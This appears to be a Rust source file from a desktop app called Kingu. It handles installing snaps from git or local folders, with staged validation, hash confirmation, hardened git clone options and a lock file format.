//! Installing, updating, uninstalling and creating user snaps, and the repo lock file.
//!
//! Install is two steps so the user sees what they get before anything lands in the snaps dir:
//! `prepare_*` clones (git) or copies (folder) into `<app cache>/snap-staging/<token>/src`,
//! checks it (no symlinks, size limits, every candidate manifest validated) and returns the
//! candidates; the webview shows a native confirm; `commit` validates again, checks the hash the
//! user was shown and swaps the snap into `<config dir>/snaps/<id>` atomically. Nothing from the
//! snap runs at any point: git runs with hooks off, no submodules, no LFS smudge and only the
//! https, ssh and file transports, non-interactively and with a timeout.
//!
//! Where an installed snap came from is recorded in `<id>/.kingu-snap.json`. It is a hidden file,
//! so it is not part of the trust hash (`snap::snap_hash` covers `snap.toml` and skill files only).
//!
//! The lock file `<root>/.kingu/snaps.lock` (JSON) pins each repo snap's id, version and hash:
//! `{ "version": 1, "snaps": [{ "id", "version", "sha256" }] }`. A repo snap that differs from its
//! entry is flagged in the Snaps view; trust is still required separately.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Manager};

use crate::i18n::msg::SnapMsg;
use crate::settings::write_atomic;
use crate::snap::{MANIFEST, MAX_MANIFEST_BYTES, Permissions, REPO_DIR, Source, SnapInfo, TrustData, USER_DIR, config_dir, is_snap_id, read_snap, repo_snaps_dir};
use crate::tr;
use crate::workspace::Workspace;

pub const ORIGIN_FILE: &str = ".kingu-snap.json";
const STAGING_DIR: &str = "snap-staging";
const STAGED_META: &str = "staged.json";
const LOCK_FILE: &str = "snaps.lock";
/// Per install (clone or folder), `.git` excluded.
pub const MAX_FILES: usize = 2000;
pub const MAX_BYTES: u64 = 20 * 1024 * 1024;
const MAX_DEPTH: usize = 32;
const STAGING_TTL: Duration = Duration::from_secs(60 * 60);
pub(crate) const CLONE_TIMEOUT: Duration = Duration::from_secs(120);

/// Serializes changes to the user snaps dir (install, update, uninstall, new).
static INSTALL_LOCK: Mutex<()> = Mutex::new(());

fn now_secs() -> u64 {
  SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or_default()
}

fn unique() -> String {
  static COUNTER: AtomicU64 = AtomicU64::new(0);
  let nanos = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or_default();
  format!("{nanos:x}{:x}{:x}", std::process::id(), COUNTER.fetch_add(1, Ordering::SeqCst))
}

// ---------------------------------------------------------------------------------------------
// Origin record

/// `<id>/.kingu-snap.json`: a git install has `url` (+ `ref`, `commit`), a folder install `path`.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Default)]
pub struct Origin {
  #[serde(default)]
  pub url: Option<String>,
  #[serde(default, rename = "ref")]
  pub git_ref: Option<String>,
  #[serde(default)]
  pub commit: Option<String>,
  #[serde(default)]
  pub path: Option<String>,
  /// Installed from the team library: which server and published version.
  #[serde(default, skip_serializing_if = "Option::is_none")]
  pub team: Option<TeamOrigin>,
  #[serde(default)]
  pub installed_at: u64,
}

/// A team library install: the (normalized) server URL and the published version.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq, Default)]
pub struct TeamOrigin {
  pub server: String,
  pub version: String,
}

impl Origin {
  /// Replacing an installed snap is allowed only from the same place it came from.
  fn same_source(&self, other: &Origin) -> bool {
    matches!((&self.url, &other.url), (Some(a), Some(b)) if a == b)
      || matches!((&self.path, &other.path), (Some(a), Some(b)) if a == b)
      || matches!((&self.team, &other.team), (Some(a), Some(b)) if a.server == b.server)
  }
}

/// The origin record of an installed snap; `None` when missing, a symlink, too big or corrupt.
pub fn read_origin(snap_dir: &Path) -> Option<Origin> {
  let file = snap_dir.join(ORIGIN_FILE);
  let meta = std::fs::symlink_metadata(&file).ok()?;
  if !meta.is_file() || meta.len() > 64 * 1024 {
    return None;
  }
  serde_json::from_slice(&std::fs::read(file).ok()?).ok()
}

// ---------------------------------------------------------------------------------------------
// Sources

/// A git source the user typed: `<url>` or `<url>#<branch or tag>`.
#[derive(Debug, PartialEq, Clone)]
pub struct GitSpec {
  pub url: String,
  pub git_ref: Option<String>,
}

fn is_ref(r: &str) -> bool {
  !r.is_empty()
    && r.len() <= 255
    && !r.starts_with('-')
    && !r.starts_with('/')
    && !r.ends_with('/')
    && !r.contains("..")
    && !r.contains("@{")
    && !r.ends_with(".lock")
    && r.bytes().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b'-' | b'/'))
}

fn bad_url(url: &str) -> String {
  tr!(SnapMsg::GitUrlInvalid, url = format!("{url:?}"))
}

/// Accepts https, ssh (URL or `user@host:path`), and local paths (absolute or `file://`). Refuses
/// anything git would read as an option, `<transport>::<address>` (`ext::` runs a command),
/// plain http/git (unencrypted) and hosts that start with `-`.
pub fn parse_git_source(input: &str) -> Result<GitSpec, String> {
  let input = input.trim();
  let (url, git_ref) = match input.rsplit_once('#') {
    Some((u, r)) => (u, Some(r)),
    None => (input, None),
  };
  if let Some(r) = git_ref
    && !is_ref(r)
  {
    return Err(tr!(SnapMsg::RefInvalid, git_ref = format!("{r:?}")));
  }
  if url.is_empty() || url.len() > 2048 || url.starts_with('-') || url.chars().any(|c| c.is_whitespace() || c.is_control()) {
    return Err(bad_url(url));
  }
  let scheme_end = url.find("://");
  let transport = url.find("::");
  if transport.is_some_and(|t| scheme_end.is_none_or(|s| t < s)) {
    return Err(bad_url(url));
  }
  let ok = if let Some(i) = scheme_end {
    let scheme = url[..i].to_ascii_lowercase();
    let rest = &url[i + 3..];
    let host = rest.split('/').next().unwrap_or_default();
    let host = host.rsplit('@').next().unwrap_or_default();
    match scheme.as_str() {
      "https" | "ssh" => !host.is_empty() && !host.starts_with('-') && rest.len() > host.len(),
      "file" => rest.starts_with('/'),
      _ => false,
    }
  } else if url.starts_with('/') {
    true
  } else if let Some((host, path)) = url.split_once(':') {
    // scp-like `[user@]host:path`
    let (user, host) = host.rsplit_once('@').unwrap_or(("", host));
    let plain = |s: &str| s.bytes().all(|c| c.is_ascii_alphanumeric() || matches!(c, b'.' | b'_' | b'-'));
    !host.is_empty() && !host.starts_with('-') && !user.starts_with('-') && plain(host) && plain(user) && !path.is_empty()
  } else {
    false
  };
  if !ok {
    return Err(bad_url(url));
  }
  Ok(GitSpec { url: url.to_string(), git_ref: git_ref.map(String::from) })
}

// ---------------------------------------------------------------------------------------------
// Walking and copying

struct Budget {
  files: usize,
  bytes: u64,
}

/// Every regular file under `dir` (relative, `/`-separated). `.git` is skipped anywhere and the
/// origin record at the top; a symlink, a special file or going over the limits is an error.
fn walk(dir: &Path, prefix: &str, depth: usize, budget: &mut Budget, out: &mut Vec<String>) -> Result<(), String> {
  if depth > MAX_DEPTH {
    return Err(tr!(SnapMsg::TooDeep, max = MAX_DEPTH));
  }
  let mut entries: Vec<_> = std::fs::read_dir(dir).map_err(|e| tr!(SnapMsg::ReadFailed, path = dir.display(), detail = e))?.flatten().collect();
  entries.sort_by_key(|e| e.file_name());
  for entry in entries {
    let name = entry.file_name().to_string_lossy().into_owned();
    if name == ".git" || (prefix.is_empty() && name == ORIGIN_FILE) {
      continue;
    }
    let rel = if prefix.is_empty() { name.clone() } else { format!("{prefix}/{name}") };
    let meta = std::fs::symlink_metadata(entry.path()).map_err(|e| tr!(SnapMsg::ReadFailed, path = rel, detail = e))?;
    if meta.file_type().is_symlink() {
      return Err(tr!(SnapMsg::SourceSymlink, path = rel));
    }
    if meta.is_dir() {
      walk(&entry.path(), &rel, depth + 1, budget, out)?;
    } else if meta.is_file() {
      budget.files += 1;
      budget.bytes += meta.len();
      if budget.files > MAX_FILES || budget.bytes > MAX_BYTES {
        return Err(tr!(SnapMsg::SourceTooBig, files = MAX_FILES, mb = MAX_BYTES / 1024 / 1024));
      }
      out.push(rel);
    } else {
      return Err(tr!(SnapMsg::NotPlain, path = rel));
    }
  }
  Ok(())
}

fn files_of(dir: &Path) -> Result<Vec<String>, String> {
  let mut out = Vec::new();
  walk(dir, "", 0, &mut Budget { files: 0, bytes: 0 }, &mut out)?;
  Ok(out)
}

/// Copies `files` (from `walk`) of `from` into `to`, keeping permissions (a task may run a script).
fn copy_files(from: &Path, to: &Path, files: &[String]) -> Result<(), String> {
  std::fs::create_dir_all(to).map_err(|e| tr!(SnapMsg::CreateFailed, path = to.display(), detail = e))?;
  for rel in files {
    let dst = to.join(rel);
    if let Some(parent) = dst.parent() {
      std::fs::create_dir_all(parent).map_err(|e| tr!(SnapMsg::CreateFailed, path = parent.display(), detail = e))?;
    }
    std::fs::copy(from.join(rel), &dst).map_err(|e| tr!(SnapMsg::CopyFailed, path = rel, detail = e))?;
  }
  Ok(())
}

// ---------------------------------------------------------------------------------------------
// Staging

/// A snap found in a staged source: `rel` is `""` (manifest at the root) or `snaps/<id>`.
#[derive(Serialize, Clone, Debug)]
pub struct Candidate {
  pub rel: String,
  pub snap: SnapInfo,
}

#[derive(Serialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct Prepared {
  pub token: String,
  pub origin: Origin,
  pub candidates: Vec<Candidate>,
  /// Installed user snaps with a candidate's id (what an install would replace).
  pub existing: Vec<SnapInfo>,
}

fn is_token(s: &str) -> bool {
  !s.is_empty() && s.len() <= 64 && s.bytes().all(|c| c.is_ascii_hexdigit())
}

/// The `id` of a manifest without validating the rest (to name the snap of a root layout).
fn peek_id(text: &str) -> Option<String> {
  let table: toml::Table = toml::from_str(text).ok()?;
  table.get("id")?.as_str().map(String::from)
}

/// `snap.toml` at the root, or else every `snaps/<id>/snap.toml` (a repo holding several snaps).
fn candidates(src: &Path) -> Result<Vec<Candidate>, String> {
  let trust = TrustData::default();
  let root_manifest = src.join(MANIFEST);
  if std::fs::symlink_metadata(&root_manifest).is_ok_and(|m| m.is_file()) {
    let text = std::fs::read_to_string(&root_manifest).unwrap_or_default();
    let snap = match peek_id(&text).filter(|id| is_snap_id(id)) {
      Some(id) => read_snap(src, &id, Source::User, None, &trust),
      None => {
        let e = crate::snap::parse_manifest(&text, "").err().unwrap_or_else(|| tr!(SnapMsg::InvalidIdShort));
        let mut s = read_snap(src, "invalid", Source::User, None, &trust);
        s.error = Some(e);
        s
      }
    };
    return Ok(vec![Candidate { rel: String::new(), snap }]);
  }
  let mut out = Vec::new();
  let snaps = src.join(USER_DIR);
  if std::fs::symlink_metadata(&snaps).is_ok_and(|m| m.is_dir()) {
    let mut entries: Vec<_> = std::fs::read_dir(&snaps).map_err(|e| e.to_string())?.flatten().collect();
    entries.sort_by_key(|e| e.file_name());
    for entry in entries {
      let name = entry.file_name().to_string_lossy().into_owned();
      let dir = entry.path();
      if name.starts_with('.') || !std::fs::symlink_metadata(&dir).is_ok_and(|m| m.is_dir()) || !dir.join(MANIFEST).is_file() {
        continue;
      }
      out.push(Candidate { rel: format!("{USER_DIR}/{name}"), snap: read_snap(&dir, &name, Source::User, None, &trust) });
    }
  }
  if out.is_empty() {
    return Err(tr!(SnapMsg::NoManifestInSource, manifest = MANIFEST));
  }
  Ok(out)
}

/// Removes staging folders left behind (the app quit during a confirm).
fn prune_staging(staging: &Path) {
  let Ok(read) = std::fs::read_dir(staging) else { return };
  for entry in read.flatten() {
    let old = entry.metadata().and_then(|m| m.modified()).ok().and_then(|t| t.elapsed().ok()).is_some_and(|age| age > STAGING_TTL);
    if old {
      let _ = std::fs::remove_dir_all(entry.path());
    }
  }
}

fn new_stage(staging: &Path) -> Result<(String, PathBuf), String> {
  prune_staging(staging);
  let token = unique();
  let dir = staging.join(&token);
  std::fs::create_dir_all(&dir).map_err(|e| tr!(SnapMsg::CreateFailed, path = dir.display(), detail = e))?;
  Ok((token, dir))
}

/// Validates the staged `src`, records the origin next to it and lists the candidates.
fn finish_stage(token: String, dir: &Path, origin: Origin, user_dir: &Path) -> Result<Prepared, String> {
  let src = dir.join("src");
  files_of(&src)?;
  let candidates = candidates(&src)?;
  let meta = serde_json::to_string(&origin).map_err(|e| e.to_string())?;
  std::fs::write(dir.join(STAGED_META), meta).map_err(|e| e.to_string())?;
  let installed = crate::snap::scan(user_dir, Source::User, None, &TrustData::default());
  let existing = installed.into_iter().filter(|s| candidates.iter().any(|c| c.snap.id == s.id)).collect();
  let candidates = candidates.into_iter().map(|mut c| {
    c.snap.origin = None;
    c
  });
  Ok(Prepared { token, origin, candidates: candidates.collect(), existing })
}

/// Runs `f` on a fresh staging folder; the folder is removed when it fails.
fn staged(staging: &Path, f: impl FnOnce(&str, &Path) -> Result<Prepared, String>) -> Result<Prepared, String> {
  let (token, dir) = new_stage(staging)?;
  let result = f(&token, &dir);
  if result.is_err() {
    let _ = std::fs::remove_dir_all(&dir);
  }
  result
}

/// `git clone --depth 1` of `spec` into `<dir>/src`; returns the commit. Never prompts, runs no
/// hooks, fetches no submodules or LFS objects, and only speaks https, ssh and local paths.
pub(crate) fn clone(dir: &Path, spec: &GitSpec, timeout: Duration) -> Result<String, String> {
  let mut args = vec![
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "core.fsmonitor=false",
    "-c",
    "protocol.ext.allow=never",
    "clone",
    "--depth",
    "1",
    "--single-branch",
    "--no-recurse-submodules",
    "--template=",
  ];
  if let Some(r) = &spec.git_ref {
    args.extend(["--branch", r.as_str()]);
  }
  args.extend(["--", spec.url.as_str(), "src"]);
  let env = [("GIT_ALLOW_PROTOCOL", "https:ssh:file"), ("GIT_LFS_SKIP_SMUDGE", "1")];
  crate::git_remote::net_env(dir, &args, &env, &AtomicBool::new(false), timeout)?;
  let src = dir.join("src");
  let commit = crate::git::run(&src, &["rev-parse", "HEAD"]).map(|o| String::from_utf8_lossy(&o).trim().to_string())?;
  std::fs::remove_dir_all(src.join(".git")).map_err(|e| tr!(SnapMsg::RemoveGitFailed, detail = e))?;
  Ok(commit)
}

fn prepare_spec(staging: &Path, user_dir: &Path, spec: &GitSpec, timeout: Duration) -> Result<Prepared, String> {
  staged(staging, |token, dir| {
    let commit = clone(dir, spec, timeout)?;
    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(commit), path: None, team: None, installed_at: 0 };
    finish_stage(token.to_string(), dir, origin, user_dir)
  })
}

pub fn prepare_git(staging: &Path, user_dir: &Path, input: &str, timeout: Duration) -> Result<Prepared, String> {
  prepare_spec(staging, user_dir, &parse_git_source(input)?, timeout)
}

pub fn prepare_folder(staging: &Path, user_dir: &Path, path: &str) -> Result<Prepared, String> {
  let from = Path::new(path);
  if !from.is_absolute() {
    return Err(tr!(SnapMsg::FolderPathNotAbsolute));
  }
  match std::fs::symlink_metadata(from) {
    Ok(m) if m.file_type().is_symlink() => return Err(tr!(SnapMsg::FolderIsSymlink)),
    Ok(m) if m.is_dir() => {}
    _ => return Err(tr!(SnapMsg::FolderNotFound, path)),
  }
  staged(staging, |token, dir| {
    let files = files_of(from)?;
    copy_files(from, &dir.join("src"), &files)?;
    let origin = Origin { path: Some(path.to_string()), ..Origin::default() };
    finish_stage(token.to_string(), dir, origin, user_dir)
  })
}

/// Fetches a git-installed snap again from its origin (same URL and ref) for an update.
pub fn prepare_update(staging: &Path, user_dir: &Path, id: &str, timeout: Duration) -> Result<Prepared, String> {
  if !is_snap_id(id) {
    return Err(tr!(SnapMsg::InvalidId, id));
  }
  let origin = read_origin(&user_dir.join(id)).ok_or_else(|| tr!(SnapMsg::NotInstalledByKingu, id))?;
  let url = origin.url.ok_or_else(|| tr!(SnapMsg::NotFromGit, id))?;
  let spec = parse_git_source(&match &origin.git_ref {
    Some(r) => format!("{url}#{r}"),
    None => url,
  })?;
  let mut p = prepare_spec(staging, user_dir, &spec, timeout)?;
  p.candidates.retain(|c| c.snap.id == id);
  if p.candidates.is_empty() {
    cancel(staging, &p.token);
    return Err(tr!(SnapMsg::RepoDropped, id));
  }
  Ok(p)
}

/// A team-approved snap: install exactly `commit` of `url`, and only if snap `id` there hashes to
/// `sha256` (the trust hash, `SnapInfo::hash`).
#[derive(Debug, Clone, PartialEq)]
pub struct Pin {
  pub id: String,
  pub url: String,
  pub git_ref: Option<String>,
  pub commit: String,
  pub sha256: String,
}

pub fn is_commit(s: &str) -> bool {
  s.len() == 40 && s.bytes().all(|c| matches!(c, b'0'..=b'9' | b'a'..=b'f'))
}

pub fn is_sha256(s: &str) -> bool {
  s.len() == 64 && s.bytes().all(|c| matches!(c, b'0'..=b'9' | b'a'..=b'f'))
}

/// Fetches `commit` of `spec` into `<dir>/src` and checks it out, with the same restrictions as
/// `clone`. Tries a shallow fetch of the commit itself first (needs the server to allow it, as
/// GitHub and protocol v2 do), then the ref's (or default branch's) full history.
pub(crate) fn fetch_commit(dir: &Path, spec: &GitSpec, commit: &str, timeout: Duration) -> Result<(), String> {
  const SAFE: [&str; 6] = ["-c", "core.hooksPath=/dev/null", "-c", "core.fsmonitor=false", "-c", "protocol.ext.allow=never"];
  let env = [("GIT_ALLOW_PROTOCOL", "https:ssh:file"), ("GIT_LFS_SKIP_SMUDGE", "1")];
  let stop = AtomicBool::new(false);
  let git = |root: &Path, args: &[&str]| -> Result<String, String> {
    let all: Vec<&str> = SAFE.iter().copied().chain(args.iter().copied()).collect();
    crate::git_remote::net_env(root, &all, &env, &stop, timeout)
  };
  git(dir, &["init", "-q", "--template=", "src"])?;
  let src = dir.join("src");
  let shallow = git(&src, &["fetch", "-q", "--depth", "1", "--no-tags", "--no-recurse-submodules", "--", &spec.url, commit]);
  if shallow.is_err() {
    let r = spec.git_ref.as_deref().unwrap_or("HEAD");
    git(&src, &["fetch", "-q", "--no-tags", "--no-recurse-submodules", "--", &spec.url, r])?;
  }
  git(&src, &["checkout", "-q", "--detach", commit]).map_err(|_| tr!(SnapMsg::PinnedCommitMissing, commit, url = spec.url))?;
  let head = crate::git::run(&src, &["rev-parse", "HEAD"]).map(|o| String::from_utf8_lossy(&o).trim().to_string())?;
  if head != commit {
    return Err(tr!(SnapMsg::PinnedCommitMismatch, head, commit));
  }
  std::fs::remove_dir_all(src.join(".git")).map_err(|e| tr!(SnapMsg::RemoveGitFailed, detail = e))
}

/// Stages a team snap at its pinned commit. Refuses before the confirm when the snap there is
/// broken or its hash is not the one the team approved.
pub fn prepare_pinned(staging: &Path, user_dir: &Path, pin: &Pin, timeout: Duration) -> Result<Prepared, String> {
  if !is_snap_id(&pin.id) || !is_commit(&pin.commit) || !is_sha256(&pin.sha256) {
    return Err(tr!(SnapMsg::TeamPinInvalid, id = pin.id));
  }
  let spec = parse_git_source(&pin.url)?;
  if let Some(r) = &pin.git_ref
    && !is_ref(r)
  {
    return Err(tr!(SnapMsg::TeamRefInvalid, git_ref = format!("{r:?}")));
  }
  let spec = GitSpec { git_ref: pin.git_ref.clone(), ..spec };
  let mut p = staged(staging, |token, dir| {
    fetch_commit(dir, &spec, &pin.commit, timeout)?;
    let origin = Origin { url: Some(spec.url.clone()), git_ref: spec.git_ref.clone(), commit: Some(pin.commit.clone()), path: None, team: None, installed_at: 0 };
    finish_stage(token.to_string(), dir, origin, user_dir)
  })?;
  p.candidates.retain(|c| c.snap.id == pin.id);
  let short = |h: &str| h.get(..12).unwrap_or(h).to_string();
  let refuse = |p: &Prepared, msg: String| -> Result<Prepared, String> {
    cancel(staging, &p.token);
    Err(msg)
  };
  let Some(c) = p.candidates.first() else {
    return refuse(&p, tr!(SnapMsg::CommitLacksSnap, commit = short(&pin.commit), id = pin.id));
  };
  if let Some(e) = &c.snap.error {
    return refuse(&p, tr!(SnapMsg::CommitSnapBroken, id = pin.id, detail = e));
  }
  if c.snap.hash != pin.sha256 {
    return refuse(
      &p,
      tr!(SnapMsg::HashMismatch, id = pin.id, got = short(&c.snap.hash), approved = short(&pin.sha256)),
    );
  }
  p.existing.retain(|e| e.id == pin.id);
  Ok(p)
}

pub fn cancel(staging: &Path, token: &str) {
  if is_token(token) {
    let _ = std::fs::remove_dir_all(staging.join(token));
  }
}

/// Installs candidate `id` of the staged `token` into `user_dir/<id>`. `hash` is what the user
/// confirmed; `replace` allows replacing an installed snap from the same origin (an update).
pub fn commit(staging: &Path, user_dir: &Path, token: &str, id: &str, hash: &str, replace: bool) -> Result<(), String> {
  if !is_token(token) || !is_snap_id(id) {
    return Err(tr!(SnapMsg::InstallDataInvalid));
  }
  let dir = staging.join(token);
  let origin: Origin = std::fs::read(dir.join(STAGED_META))
    .ok()
    .and_then(|b| serde_json::from_slice(&b).ok())
    .ok_or_else(|| tr!(SnapMsg::StagingGone))?;
  let src = dir.join("src");
  files_of(&src)?;
  let cand = candidates(&src)?.into_iter().find(|c| c.snap.id == id).ok_or_else(|| tr!(SnapMsg::NotInStaging, id))?;
  if let Some(e) = &cand.snap.error {
    return Err(tr!(SnapMsg::InstallBroken, id, detail = e));
  }
  if cand.snap.hash != hash {
    return Err(tr!(SnapMsg::ChangedWhileWaiting, id));
  }
  let from = if cand.rel.is_empty() { src } else { src.join(&cand.rel) };
  let result = {
    let _guard = INSTALL_LOCK.lock().unwrap_or_else(|e| e.into_inner());
    install_dir(user_dir, id, &from, &origin, replace)
  };
  let _ = std::fs::remove_dir_all(&dir);
  result
}

/// Copies `from` into `user_dir/<id>` beside the old one, then swaps with renames, so a reader
/// sees the old snap or the new one, never a mix.
fn install_dir(user_dir: &Path, id: &str, from: &Path, origin: &Origin, replace: bool) -> Result<(), String> {
  std::fs::create_dir_all(user_dir).map_err(|e| tr!(SnapMsg::CreateFailed, path = user_dir.display(), detail = e))?;
  let target = user_dir.join(id);
  let exists = match std::fs::symlink_metadata(&target) {
    Ok(m) if m.file_type().is_symlink() || !m.is_dir() => return Err(tr!(SnapMsg::TargetNotFolder, path = target.display())),
    Ok(_) => true,
    Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
    Err(e) => return Err(tr!(SnapMsg::ReadFailed, path = target.display(), detail = e)),
  };
  if exists {
    if !replace {
      return Err(tr!(SnapMsg::AlreadyInstalled, id));
    }
    if !read_origin(&target).is_some_and(|o| o.same_source(origin)) {
      return Err(tr!(SnapMsg::InstalledElsewhere, id));
    }
  }
  let stamp = unique();
  let tmp = user_dir.join(format!(".tmp-{id}-{stamp}"));
  let build = || -> Result<(), String> {
    copy_files(from, &tmp, &files_of(from)?)?;
    let record = Origin { installed_at: now_secs(), ..origin.clone() };
    let text = serde_json::to_string_pretty(&record).map_err(|e| e.to_string())?;
    std::fs::write(tmp.join(ORIGIN_FILE), text + "\n").map_err(|e| tr!(SnapMsg::SaveFileFailed, file = ORIGIN_FILE, detail = e))
  };
  if let Err(e) = build() {
    let _ = std::fs::remove_dir_all(&tmp);
    return Err(e);
  }
  if !exists {
    return std::fs::rename(&tmp, &target).map_err(|e| {
      let _ = std::fs::remove_dir_all(&tmp);
      tr!(SnapMsg::MoveInFailed, detail = e)
    });
  }
  let old = user_dir.join(format!(".old-{id}-{stamp}"));
  std::fs::rename(&target, &old).map_err(|e| {
    let _ = std::fs::remove_dir_all(&tmp);
    tr!(SnapMsg::MoveOldFailed, detail = e)
  })?;
  if let Err(e) = std::fs::rename(&tmp, &target) {
    let _ = std::fs::rename(&old, &target);
    let _ = std::fs::remove_dir_all(&tmp);
    return Err(tr!(SnapMsg::MoveNewFailed, detail = e));
  }
  let _ = std::fs::remove_dir_all(&old);
  Ok(())
}

// ---------------------------------------------------------------------------------------------
// Uninstall and New Snap

/// Hands the user snap folder `id` to `trash` (the system Trash in the app, a stand-in in tests).
pub fn uninstall(user_dir: &Path, id: &str, trash: impl FnOnce(&Path) -> Result<(), String>) -> Result<(), String> {
  if !is_snap_id(id) {
    return Err(tr!(SnapMsg::InvalidId, id));
  }
  let path = user_dir.join(id);
  std::fs::symlink_metadata(&path).map_err(|_| tr!(SnapMsg::NotInUserSnaps, id))?;
  let _guard = INSTALL_LOCK.lock().unwrap_or_else(|e| e.into_inner());
  trash(&path)
}

/// `<root>/.kingu/snaps`, created when missing; a symlinked part is refused (it would put the
/// snap outside the repo).
pub fn ensure_repo_snaps_dir(root: &Path) -> Result<PathBuf, String> {
  let mut dir = root.to_path_buf();
  for part in REPO_DIR {
    dir.push(part);
    match std::fs::symlink_metadata(&dir) {
      Ok(m) if m.file_type().is_symlink() || !m.is_dir() => return Err(tr!(SnapMsg::NotPlainFolder, path = dir.display())),
      Ok(_) => {}
      Err(_) => std::fs::create_dir(&dir).map_err(|e| tr!(SnapMsg::CreateFailed, path = dir.display(), detail = e))?,
    }
  }
  Ok(dir)
}

pub fn template(id: &str, name: &str) -> String {
  let name = toml::Value::String(name.to_string()).to_string();
  let header = tr!(SnapMsg::TemplateHeader);
  let id_rule = tr!(SnapMsg::TemplateId);
  let permissions = tr!(SnapMsg::TemplatePermissions);
  let secrets = tr!(SnapMsg::TemplateSecrets);
  let tasks = tr!(SnapMsg::TemplateTasks);
  let settings = tr!(SnapMsg::TemplateSettings, id);
  let greeting = toml::Value::String(tr!(SnapMsg::TemplateGreeting)).to_string();
  let mcp = tr!(SnapMsg::TemplateMcp);
  let skills = tr!(SnapMsg::TemplateSkills);
  format!(
    r#"# {header}
# {id_rule}
id = "{id}"
name = {name}
version = "0.1.0"
description = ""

# {permissions}
[permissions]
network = false
fs = "worktree"   # "worktree" | "home"
secrets = []      # {secrets}

# {tasks}
[[tasks]]
id = "hello"
title = "Say hello"
command = ["echo", "${{setting:greeting}}"]

# {settings}
[[settings]]
key = "greeting"
type = "string"   # "string" | "boolean" | "number"
default = "Hello from {id}"
description = {greeting}

# {mcp}
# [mcp.example]
# command = ["my-mcp-server", "--stdio"]
# env = {{ LOG_LEVEL = "info" }}

# {skills}
# [[skills]]
# path = "skills/my-skill"
"#
  )
}

/// Writes a new snap folder `base/<id>` with a commented template; returns its `snap.toml`.
pub fn create(base: &Path, id: &str, name: &str) -> Result<PathBuf, String> {
  if !is_snap_id(id) {
    return Err(tr!(SnapMsg::InvalidIdRules, id));
  }
  let name = name.trim();
  if name.is_empty() || name.chars().count() > 100 || name.chars().any(char::is_control) {
    return Err(tr!(SnapMsg::NameInvalid));
  }
  let _guard = INSTALL_LOCK.lock().unwrap_or_else(|e| e.into_inner());
  let dir = base.join(id);
  if std::fs::symlink_metadata(&dir).is_ok() {
    return Err(tr!(SnapMsg::AlreadyExists, path = dir.display()));
  }
  std::fs::create_dir_all(&dir).map_err(|e| tr!(SnapMsg::CreateFailed, path = dir.display(), detail = e))?;
  let file = dir.join(MANIFEST);
  std::fs::write(&file, template(id, name)).map_err(|e| tr!(SnapMsg::WriteFailed, path = file.display(), detail = e))?;
  Ok(file)
}

// ---------------------------------------------------------------------------------------------
// Lock file

/// Where a locked snap lives: the repo's `.kingu/snaps` (the default), or the team library
/// (installed as a user snap; the lock says which published version the project expects).
#[derive(Serialize, Deserialize, Clone, Copy, Debug, PartialEq, Default)]
#[serde(rename_all = "lowercase")]
pub enum LockSource {
  #[default]
  Repo,
  Team,
}

fn is_repo(s: &LockSource) -> bool {
  *s == LockSource::Repo
}

/// One pinned snap. `sha256` is the trust hash (`SnapInfo::hash`); `files` and `scripts` hold
/// each covered file's own SHA-256 (`snap.toml` included), so a mismatch names what changed.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct LockEntry {
  pub id: String,
  pub version: String,
  pub sha256: String,
  #[serde(default, skip_serializing_if = "is_repo")]
  pub source: LockSource,
  #[serde(default, skip_serializing_if = "Option::is_none")]
  pub permissions: Option<Permissions>,
  #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
  pub files: BTreeMap<String, String>,
  #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
  pub scripts: BTreeMap<String, String>,
}

impl LockEntry {
  pub fn of(snap: &SnapInfo, source: LockSource) -> Self {
    let mut files: BTreeMap<String, String> = snap.files.iter().map(|f| (f.path.clone(), f.sha256.clone())).collect();
    if !snap.manifest_sha256.is_empty() {
      files.insert(MANIFEST.to_string(), snap.manifest_sha256.clone());
    }
    Self {
      id: snap.id.clone(),
      version: snap.version.clone(),
      sha256: snap.hash.clone(),
      source,
      permissions: Some(snap.permissions.clone()),
      files,
      scripts: snap.scripts.iter().map(|f| (f.path.clone(), f.sha256.clone())).collect(),
    }
  }
}

/// Version 2 adds `source`, `permissions`, `files` and `scripts`; version 1 files still read.
pub const LOCK_VERSION: u32 = 2;

#[derive(Serialize, Deserialize, Debug, PartialEq, Default)]
pub struct Lock {
  pub version: u32,
  #[serde(default)]
  pub snaps: Vec<LockEntry>,
}

/// A snap against `.kingu/snaps.lock`: same version and hash, different, or not listed.
#[derive(Serialize, Clone, Copy, Debug, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum LockStatus {
  Locked,
  Changed,
  Unlocked,
}

impl Lock {
  fn find(&self, id: &str, source: LockSource) -> Option<&LockEntry> {
    self.snaps.iter().find(|e| e.id == id && e.source == source)
  }

  /// The repo snap's entry.
  pub fn entry(&self, id: &str) -> Option<&LockEntry> {
    self.find(id, LockSource::Repo)
  }

  /// The team snap's entry.
  pub fn team_entry(&self, id: &str) -> Option<&LockEntry> {
    self.find(id, LockSource::Team)
  }

  fn matches(e: &LockEntry, snap: &SnapInfo) -> bool {
    e.sha256 == snap.hash && e.version == snap.version && snap.error.is_none()
  }

  /// A repo snap against its entry.
  pub fn status(&self, snap: &SnapInfo) -> LockStatus {
    match self.entry(&snap.id) {
      None => LockStatus::Unlocked,
      Some(e) if Self::matches(e, snap) => LockStatus::Locked,
      Some(_) => LockStatus::Changed,
    }
  }

  /// An installed user snap against a team entry with its id; None when the lock has none.
  pub fn team_status(&self, snap: &SnapInfo) -> Option<LockStatus> {
    let e = self.team_entry(&snap.id)?;
    Some(if Self::matches(e, snap) { LockStatus::Locked } else { LockStatus::Changed })
  }

  /// Adds or replaces the entry with the same id and source; entries stay sorted by id.
